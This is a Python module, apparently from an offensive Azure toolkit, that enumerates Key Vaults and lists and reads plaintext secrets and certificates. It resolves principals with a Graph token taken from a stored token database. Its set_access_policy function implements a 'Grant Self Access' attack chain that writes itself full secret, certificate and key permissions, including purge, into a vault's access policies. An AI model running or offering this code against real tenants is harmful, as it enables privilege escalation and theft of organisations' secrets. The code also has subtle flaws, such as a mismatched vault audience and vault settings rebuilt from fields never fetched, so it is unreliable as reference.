"""
KeyVault Service - Azure Key Vault enumeration & operations
Enumerate Key Vaults (ARM)- Data Plane operations (secrets, certificates, keys)
Access Policies management (Grant Self Access)
Audience ARM: https://management.azure.com/.default
Audience Data Plane: https://vault.azure.com/.default
"""
import requests
import time


class KeyVaultService:
    
    def __init__(self, access_token, data_plane_token=None):
        self.access_token = access_token  # ARM token
        self.data_plane_token = data_plane_token  # Data plane token (if available)
        self.base_url = 'https://management.azure.com'
        self.api_version = '2023-02-01'
        self.data_plane_api_version = '7.4'  # Key Vault REST API version
        self.timeout = 30
    
    def _make_request(self, endpoint, method='GET', json_data=None, use_data_plane=False, **kwargs):
        """Make request to ARM or Data Plane API"""
        if use_data_plane:
            # Data plane request (direct to vault)
            url = endpoint  # Full URL for data plane
            token = self.data_plane_token or self.access_token
        else:
            # ARM request
            url = f"{self.base_url}{endpoint}"
            token = self.access_token
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        
        max_retries = 3
        for attempt in range(max_retries):
            try:
                response = requests.request(
                    method,
                    url,
                    headers=headers,
                    timeout=self.timeout,
                    json=json_data,
                    **kwargs
                )
                
                if response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 5))
                    print(f"[429 Rate Limit] Waiting {retry_after}s...")
                    time.sleep(retry_after)
                    continue
                
                if response.status_code in [200, 201, 202, 204]:
                    if response.status_code == 204 or not response.content:
                        return {'success': True, 'data': {}}
                    return {'success': True, 'data': response.json()}
                else:
                    error_detail = response.text
                    error_code = None
                    try:
                        error_json = response.json()
                        if 'error' in error_json:
                            error_detail = error_json['error'].get('message', response.text)
                            error_code = error_json['error'].get('code', None)
                    except:
                        pass
                    
                    print(f"[KEYVAULT ERROR] {method} {url}")
                    print(f"[KEYVAULT ERROR] Status: {response.status_code}")
                    print(f"[KEYVAULT ERROR] Code: {error_code}")
                    
                    is_permission_denied = response.status_code == 403
                    
                    result = {
                        'success': False,
                        'error': f'KeyVault API returned {response.status_code}',
                        'details': error_detail,
                        'error_code': error_code
                    }
                    
                    if is_permission_denied:
                        result['permission_denied'] = True
                    
                    return result
                    
            except requests.exceptions.Timeout:
                return {'success': False, 'error': 'Request timeout'}
            except requests.exceptions.RequestException as e:
                return {'success': False, 'error': str(e)}
        
        return {'success': False, 'error': 'Max retries exceeded'}
    
    # ==================== KEY VAULTS (ARM) ====================
    
    def get_key_vaults(self, subscription_id):
        """Get Key Vaults in subscription"""
        result = self._make_request(
            f'/subscriptions/{subscription_id}/providers/Microsoft.KeyVault/vaults?api-version={self.api_version}'
        )
        
        if result['success']:
            vaults = result['data'].get('value', [])
            return {
                'success': True,
                'key_vaults': [{
                    'name': v.get('name'),
                    'location': v.get('location'),
                    'id': v.get('id'),
                    'vaultUri': v.get('properties', {}).get('vaultUri'),
                    'tenantId': v.get('properties', {}).get('tenantId'),
                    'sku': v.get('properties', {}).get('sku', {}).get('name'),
                    'enableRbacAuthorization': v.get('properties', {}).get('enableRbacAuthorization'),
                    'tags': v.get('tags', {})
                } for v in vaults]
            }
        
        return result
    
    def get_key_vault_details(self, vault_id):
        """Get specific Key Vault details (includes access policies)"""
        result = self._make_request(
            f"{vault_id}?api-version={self.api_version}"
        )
        
        if result['success']:
            vault = result['data']
            return {
                'success': True,
                'vault': {
                    'name': vault.get('name'),
                    'location': vault.get('location'),
                    'id': vault.get('id'),
                    'vaultUri': vault.get('properties', {}).get('vaultUri'),
                    'tenantId': vault.get('properties', {}).get('tenantId'),
                    'sku': vault.get('properties', {}).get('sku', {}).get('name'),
                    'enableRbacAuthorization': vault.get('properties', {}).get('enableRbacAuthorization', False),
                    'accessPolicies': vault.get('properties', {}).get('accessPolicies', []),
                    'networkAcls': vault.get('properties', {}).get('networkAcls'),
                    'tags': vault.get('tags', {})
                }
            }
        
        return result
    
    # ==================== DATA PLANE OPERATIONS ====================
    
    def list_secrets(self, vault_url):
        """List secrets in Key Vault (data plane)"""
        if not self.data_plane_token:
            return {
                'success': False,
                'error': 'No data plane token available',
                'needs_token': True,
                'audience': 'https://vault.azure.net'
            }
        
        url = f"{vault_url}/secrets?api-version={self.data_plane_api_version}"
        result = self._make_request(url, use_data_plane=True)
        
        if result['success']:
            secrets = result['data'].get('value', [])
            return {
                'success': True,
                'secrets': [{
                    'id': s.get('id'),
                    'name': s.get('id').split('/')[-1] if s.get('id') else 'Unknown',
                    'enabled': s.get('attributes', {}).get('enabled'),
                    'created': s.get('attributes', {}).get('created'),
                    'updated': s.get('attributes', {}).get('updated'),
                    'contentType': s.get('contentType')
                } for s in secrets]
            }
        
        return result
    
    def get_secret(self, vault_url, secret_name):
        """Get secret value (plaintext)"""
        if not self.data_plane_token:
            return {
                'success': False,
                'error': 'No data plane token available',
                'needs_token': True,
                'audience': 'https://vault.azure.net'
            }
        
        url = f"{vault_url}/secrets/{secret_name}?api-version={self.data_plane_api_version}"
        result = self._make_request(url, use_data_plane=True)
        
        if result['success']:
            data = result['data']
            return {
                'success': True,
                'secret': {
                    'id': data.get('id'),
                    'name': secret_name,
                    'value': data.get('value'),  # Plaintext secret value
                    'enabled': data.get('attributes', {}).get('enabled'),
                    'created': data.get('attributes', {}).get('created'),
                    'updated': data.get('attributes', {}).get('updated'),
                    'contentType': data.get('contentType')
                }
            }
        
        return result
    
    def list_certificates(self, vault_url):
        """List certificates in Key Vault"""
        if not self.data_plane_token:
            return {
                'success': False,
                'error': 'No data plane token available',
                'needs_token': True,
                'audience': 'https://vault.azure.net'
            }
        
        url = f"{vault_url}/certificates?api-version={self.data_plane_api_version}"
        result = self._make_request(url, use_data_plane=True)
        
        if result['success']:
            certificates = result['data'].get('value', [])
            return {
                'success': True,
                'certificates': [{
                    'id': c.get('id'),
                    'name': c.get('id').split('/')[-1] if c.get('id') else 'Unknown',
                    'enabled': c.get('attributes', {}).get('enabled'),
                    'created': c.get('attributes', {}).get('created'),
                    'updated': c.get('attributes', {}).get('updated'),
                    'x509Thumbprint': c.get('x5t')
                } for c in certificates]
            }
        
        return result
    
    def get_certificate(self, vault_url, cert_name):
        """Get certificate (with private key if available)"""
        if not self.data_plane_token:
            return {
                'success': False,
                'error': 'No data plane token available',
                'needs_token': True,
                'audience': 'https://vault.azure.net'
            }
        
        url = f"{vault_url}/certificates/{cert_name}?api-version={self.data_plane_api_version}"
        result = self._make_request(url, use_data_plane=True)
        
        if result['success']:
            data = result['data']
            return {
                'success': True,
                'certificate': {
                    'id': data.get('id'),
                    'name': cert_name,
                    'cer': data.get('cer'),  # Base64 public cert
                    'enabled': data.get('attributes', {}).get('enabled'),
                    'created': data.get('attributes', {}).get('created'),
                    'updated': data.get('attributes', {}).get('updated'),
                    'x509Thumbprint': data.get('x5t'),
                    'policy': data.get('policy')
                }
            }
        
        return result
    
    def list_keys(self, vault_url):
        """List keys in Key Vault"""
        if not self.data_plane_token:
            return {
                'success': False,
                'error': 'No data plane token available',
                'needs_token': True,
                'audience': 'https://vault.azure.net'
            }
        
        url = f"{vault_url}/keys?api-version={self.data_plane_api_version}"
        result = self._make_request(url, use_data_plane=True)
        
        if result['success']:
            keys = result['data'].get('value', [])
            return {
                'success': True,
                'keys': [{
                    'kid': k.get('kid'),
                    'name': k.get('kid').split('/')[-1] if k.get('kid') else 'Unknown',
                    'enabled': k.get('attributes', {}).get('enabled'),
                    'created': k.get('attributes', {}).get('created'),
                    'updated': k.get('attributes', {}).get('updated')
                } for k in keys]
            }
        
        return result
    
    # ==================== ACCESS POLICIES (Management Plane) ====================
    
    def get_access_policies(self, vault_id):
        """
        Get current access policies for Key Vault
        View who has data plane permissions
        Principal ID resolution (objectId → UPN/displayName)
        """
        result = self.get_key_vault_details(vault_id)
        
        if result['success']:
            vault = result['vault']
            access_policies = vault.get('accessPolicies', [])
            
            # Extract unique objectIds for resolution
            object_ids = list(set([ap.get('objectId') for ap in access_policies if ap.get('objectId')]))
            
            print(f"[ACCESS POLICIES] Found {len(access_policies)} policies with {len(object_ids)} unique principals")
            
            # Resolve principals (max 50 to avoid timeout)
            principal_map = {}
            if object_ids:
                principal_map = self._resolve_principals(object_ids[:50])
            
            # Format policies with resolved names
            formatted_policies = []
            for ap in access_policies:
                object_id = ap.get('objectId')
                principal_info = principal_map.get(object_id, {})
                
                formatted_policies.append({
                    'tenantId': ap.get('tenantId'),
                    'objectId': object_id,
                    'principalName': principal_info.get('displayName'),
                    'principalUPN': principal_info.get('userPrincipalName'),
                    'principalType': principal_info.get('type', 'Unknown'),
                    'permissions': {
                        'secrets': ap.get('permissions', {}).get('secrets', []),
                        'certificates': ap.get('permissions', {}).get('certificates', []),
                        'keys': ap.get('permissions', {}).get('keys', [])
                    }
                })
            
            return {
                'success': True,
                'vault_name': vault.get('name'),
                'enableRbacAuthorization': vault.get('enableRbacAuthorization', False),
                'access_policies': formatted_policies,
                'total': len(formatted_policies),
                'principals_resolved': len(principal_map)
            }
        
        return result
    
    def _resolve_principals(self, object_ids):
        """
        Resolve objectIds to displayName/UPN using Graph API
        
        Principal resolution for Access Policies
        
        Args:
            object_ids: List of Azure AD object IDs
            
        Returns:
            dict: {object_id: {displayName, userPrincipalName, type}}
        """
        if not object_ids:
            return {}
        
        # Find Graph token
        from models.token import Token
        graph_token = Token.query.filter(
            Token.token_type == 'access_token',
            Token.audience.like('%graph.microsoft.com%')
        ).order_by(Token.last_used_at.desc()).first()
        
        if not graph_token:
            print(f"[PRINCIPAL RESOLUTION] No Graph token available, skipping resolution")
            return {}
        
        print(f"[PRINCIPAL RESOLUTION] Resolving {len(object_ids)} principals...")
        
        headers = {
            'Authorization': f'Bearer {graph_token.access_token}',
            'Content-Type': 'application/json'
        }
        
        principal_map = {}
        resolved_count = 0
        
        # Resolve each principal (batch would be better but this is simpler)
        for object_id in object_ids[:50]:  # Max 50 to avoid timeout
            try:
                # Try as user first
                url = f"https://graph.microsoft.com/v1.0/users/{object_id}"
                response = requests.get(url, headers=headers, timeout=3)
                
                if response.status_code == 200:
                    user_data = response.json()
                    principal_map[object_id] = {
                        'displayName': user_data.get('displayName'),
                        'userPrincipalName': user_data.get('userPrincipalName'),
                        'type': 'User'
                    }
                    resolved_count += 1
                elif response.status_code == 404:
                    # Not a user, try service principal
                    url = f"https://graph.microsoft.com/v1.0/servicePrincipals/{object_id}"
                    response = requests.get(url, headers=headers, timeout=3)
                    
                    if response.status_code == 200:
                        sp_data = response.json()
                        principal_map[object_id] = {
                            'displayName': sp_data.get('displayName'),
                            'userPrincipalName': sp_data.get('appId'),  # Use appId for SPs
                            'type': 'ServicePrincipal'
                        }
                        resolved_count += 1
                    else:
                        # Try group
                        url = f"https://graph.microsoft.com/v1.0/groups/{object_id}"
                        response = requests.get(url, headers=headers, timeout=3)
                        
                        if response.status_code == 200:
                            group_data = response.json()
                            principal_map[object_id] = {
                                'displayName': group_data.get('displayName'),
                                'userPrincipalName': group_data.get('mail'),
                                'type': 'Group'
                            }
                            resolved_count += 1
                            
            except requests.exceptions.Timeout:
                print(f"[PRINCIPAL RESOLUTION] Timeout resolving {object_id}")
                continue
            except Exception as e:
                print(f"[PRINCIPAL RESOLUTION] Error resolving {object_id}: {e}")
                continue
        
        print(f"[PRINCIPAL RESOLUTION] Successfully resolved {resolved_count}/{len(object_ids)} principals")
        return principal_map
    
    def set_access_policy(self, vault_id, principal_id, tenant_id, secrets_permissions=None, certificates_permissions=None, keys_permissions=None):
        """
        Grant access policy to principal (user/group/service principal)
        "Grant Self Access" attack chain
        
        PowerShell equivalent:
        Set-AzKeyVaultAccessPolicy -VaultName 'KV-Develop00' -ObjectId '<principal_id>' -PermissionsToSecrets Get,List
        
        Args:
            vault_id: Full ARM resource ID (/subscriptions/.../vaults/...)
            principal_id: Azure AD object ID (user/group/sp)
            tenant_id: Azure AD tenant ID
            secrets_permissions: List of secret permissions (e.g., ['get', 'list', 'set', 'delete'])
            certificates_permissions: List of cert permissions
            keys_permissions: List of key permissions
        """
        # Default permissions for "Grant Self Access" - full data plane access
        if secrets_permissions is None:
            secrets_permissions = ['get', 'list', 'set', 'delete', 'backup', 'restore', 'recover', 'purge']
        
        if certificates_permissions is None:
            certificates_permissions = ['get', 'list', 'create', 'delete', 'update', 'import', 'backup', 'restore', 'recover', 'purge']
        
        if keys_permissions is None:
            keys_permissions = ['get', 'list', 'create', 'delete', 'update', 'import', 'backup', 'restore', 'recover', 'purge', 'encrypt', 'decrypt', 'sign', 'verify', 'wrapKey', 'unwrapKey']
        
        # Get current vault config
        details_result = self.get_key_vault_details(vault_id)
        if not details_result['success']:
            return details_result
        
        vault = details_result['vault']
        current_policies = vault.get('accessPolicies', [])
        
        # Check if RBAC is enabled (if yes, access policies won't work)
        if vault.get('enableRbacAuthorization', False):
            return {
                'success': False,
                'error': 'Key Vault uses Azure RBAC authorization, access policies are disabled',
                'rbac_enabled': True,
                'hint': 'Use Azure role assignments instead (e.g., Key Vault Secrets User role)'
            }
        
        # Check if principal already has policy
        existing_policy = None
        for policy in current_policies:
            if policy.get('objectId') == principal_id:
                existing_policy = policy
                break
        
        # Build new/updated policy
        new_policy = {
            'tenantId': tenant_id,
            'objectId': principal_id,
            'permissions': {
                'secrets': secrets_permissions,
                'certificates': certificates_permissions,
                'keys': keys_permissions
            }
        }
        
        # Update policies list
        if existing_policy:
            # Replace existing policy
            updated_policies = [
                new_policy if p.get('objectId') == principal_id else p
                for p in current_policies
            ]
        else:
            # Add new policy
            updated_policies = current_policies + [new_policy]
        
        # Prepare PUT request body (must include ALL vault properties)
        put_body = {
            'location': vault.get('location'),
            'properties': {
                'tenantId': vault.get('tenantId'),
                'sku': {
                    'family': 'A',
                    'name': vault.get('sku')
                },
                'accessPolicies': updated_policies,
                'enabledForDeployment': vault.get('enabledForDeployment', False),
                'enabledForDiskEncryption': vault.get('enabledForDiskEncryption', False),
                'enabledForTemplateDeployment': vault.get('enabledForTemplateDeployment', False),
                'enableSoftDelete': vault.get('enableSoftDelete', True),
                'softDeleteRetentionInDays': vault.get('softDeleteRetentionInDays', 90),
                'enableRbacAuthorization': vault.get('enableRbacAuthorization', False),
                'vaultUri': vault.get('vaultUri'),
                'provisioningState': vault.get('provisioningState', 'Succeeded')
            }
        }
        
        # Add networkAcls if present
        if vault.get('networkAcls'):
            put_body['properties']['networkAcls'] = vault.get('networkAcls')
        
        # Add tags if present
        if vault.get('tags'):
            put_body['tags'] = vault.get('tags')
        
        # Make PUT request to update vault
        result = self._make_request(
            f"{vault_id}?api-version={self.api_version}",
            method='PUT',
            json_data=put_body
        )
        
        if result['success']:
            return {
                'success': True,
                'message': f"Access policy granted to {principal_id}",
                'vault_name': vault.get('name'),
                'principal_id': principal_id,
                'permissions': {
                    'secrets': secrets_permissions,
                    'certificates': certificates_permissions,
                    'keys': keys_permissions
                },
                'action': 'updated' if existing_policy else 'created'
            }
        
        return result
